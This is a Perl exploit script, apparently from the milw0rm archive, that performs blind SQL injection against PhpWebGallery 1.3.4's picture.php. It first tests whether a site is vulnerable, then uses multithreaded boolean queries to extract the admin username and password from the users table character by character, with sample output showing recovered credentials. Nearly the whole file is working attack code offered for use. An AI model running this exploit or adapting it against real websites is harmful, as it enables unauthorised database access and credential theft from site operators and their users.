#!/usr/bin/perl -W
 
#
# PhpWebGallery 1.3.4 Blind SQL Injection Exploit
# Download: http://puzzle.dl.sourceforge.net/sourceforge/phpwebgallery/phpwebgallery-1.3.4.tar.bz2
# File affected: picture.php
#
# exploit written by ka0x <ka0x01 [at] gmail [dot] com>
# D.O.M Labs - Security Researchers
# - www.domlabs.org -
#
# ka0x@domlabs:~/codes$ ./phpwebgallery.pl -u "http://localhost/gallery/picture.php?cat=1&image_id=1"
# [i] Getting default: -T 30
# [i] Getting default: -l 200
# [i] Getting default: -t 15
# 21 118 v
# [!] $EXIT_IF_NO_CHAR : I can't find a valid character, position 18.
# [i] USER / PASSWORD:
# admin / php_gallery_
#
#
 

my $MAX_FIELD_LENGTH = 200 ;
my $EXIT_IF_NO_CHAR = 1 ;
my $DEFAULT_THREADS = 15 ;
my $DEFAULT_THREADS_TIMEOUT = 30 ;
my @ascii = ( 32 .. 123 ) ;
my $DEFAULT_THREADS_TIME = 1 ;
my $pattern = 'Powered'; 

 
use LWP::UserAgent ;
 
sub _HELP_AND_EXIT
{
    die "
 
  ./$0 -u <url>
 
 Options:
  -u    <url>               Ex: http://localhost/picture.php?cat=1&image_id=1
 
 Other:
  -t    <#>                 Threads, default '$DEFAULT_THREADS'.
  -l    <#>                 Maximum table name length '$MAX_FIELD_LENGTH'.
  -T    <#>                 Timeout.
  -h                        Help (also with --help).
 
  Example:
 
  ./$0 -u \"http://localhost/gallery/picture.php?cat=1&image_id=1\"
 
" ;
}
 
 
my ($p, $w) = ({ @ARGV }, { }) ;
 
map {
	&_HELP_AND_EXIT if $_ eq '--help' or $_ eq '-h' ;
} keys %$p ;
 
map {
	die "[!] Require: $_\n[!] Help: ./$0 --help\n" unless $p->{ $_ } ;
} qw/-u/ ;
 
$p->{'-t'} = ( $p->{'-t'} and $p->{'-t'} =~ /^\d+$/ ) ? $p->{'-t'} : ( $w->{'-t'} = $DEFAULT_THREADS ) ;
$p->{'-l'} = ( $p->{'-l'} and $p->{'-l'} =~ /^\d+$/ ) ? $p->{'-l'} : ( $w->{'-l'} = $MAX_FIELD_LENGTH ) ;
$p->{'-T'} = ( $p->{'-T'} and $p->{'-T'} =~ /^\d+$/ ) ? $p->{'-T'} : ( $w->{'-T'} = $DEFAULT_THREADS_TIMEOUT ) ;
 
map {
	warn "[i] Getting default: $_ $w->{ $_ }\n" ;
} sort keys %$w ;
 
( &_IS_VULN( $p ) ) ? &_START_WORK( $p ) : die "[i] Bad pattern ? Isn't vulnerable ?\n" ;
 
 

sub _START_WORK
{
	my $p = shift ;
	my $position = 1 ;

	pipe(R, W) ;
	pipe(Rs, Ws) ;
	autoflush STDOUT 1 ;
 
	my $sql_message = '' ;
	my $msg = '' ;
	my @pid ;
 
	while( $position <= $p->{'-l'} )
    {
		my $cf ;
		unless( $cf = fork ){ &_CHECKING( $p, $position ) ; exit(0) ; }
		push(@pid, $cf) ;
 
		my $count = 0 ;
		my $can_exit ;
		my $char_printed ;
 
        while(<R>)
        {
			chomp ;
			push(@pid, (split(/:/))[1] ) if /^pid/ ;
 
			my ($res, $pos, $ascii) = ( split(/ /, $_) ) ;
			$count++ if $pos == $position ;

			print "\b" x length($msg), ($msg = "$position $ascii " . chr($ascii) ) ;
 
			if( $res eq 'yes' and $pos == $position ){
				$char_printed = $can_exit = 1 ;
				print Ws "STOP $position\n" ;
				$sql_message .= chr( $ascii ) ;
			}
 
            last if ( $can_exit or $count == @ascii );
		}
 
        map { 
			waitpid($_, 0) 
		} @pid ;
 
		unless( $char_printed )
        {
			if( $EXIT_IF_NO_CHAR )
            {
				warn "\n[!] \$EXIT_IF_NO_CHAR : I can't find a valid character, position $position.\n"  ;
				last ;
 			}
		}
		$position++ ;
    }

    print "[i] USER / PASSWORD:\n$sql_message\n" ;

}
 
sub _CHECKING
{
	my ($p, $position) = @_ ;
	my $counter = 0 ;
 
    foreach my $ascii ( @ascii )
    {
		$counter++ ;
 
		if( $counter % $p->{'-t'} == 0 )
        {
			my $stop_position ;
			eval
			{
				$SIG{'ALRM'} = sub { 
					die "non_stop\n" 
				} ;

				alarm $DEFAULT_THREADS_TIME ;
				my $line = <Rs> ;
				$stop_position = (split( / /, $line))[1] ;
				alarm 0 ;
			} ;
 
			if( ($stop_position) and $stop_position == $position ){ 
				print "\nnext position\n" ; 
				exit(0) ; 
			}
		}
 
        unless(my $pid = fork )
        {
			print Ws "pid:$pid\n" or die ;
 
            my $url = $p->{'-u'} .
                ' AND 
				ascii(substring((SELECT CONCAT(username,0x202f20,password) 
				FROM phpwebgallery_users
				LIMIT 0,1),' . $position . ',1))='. $ascii ;
 
			my $ua = LWP::UserAgent->new ;
			$ua->timeout( $p->{'-T'} ) ;
 
			my $content ;
			while( 1 )
			{
				last if $content = $ua->get( $url )->content ;
			}
 
            ( $content =~ /$pattern/ ) ? print W "yes $position $ascii\n" : print W "no $position $ascii\n" ;
 
            exit( 0 ) ;
		}
 
	}
}
 
sub _IS_VULN
{
	my $p = shift ;
	my $ua = LWP::UserAgent->new ;
	$ua->timeout( $p->{'-T'} ) ;
 
    my ( $one, $two ) = (
        $ua->get( $p->{'-u'}." AND 1=1")->content ,
        $ua->get( $p->{'-u'}." AND 1=2")->content ,
    ) ;
 
    return ($one =~ /$pattern/ and $two !~ /$pattern/) ? 1 : undef ;

}

__END__

# milw0rm.com [2008-09-12]
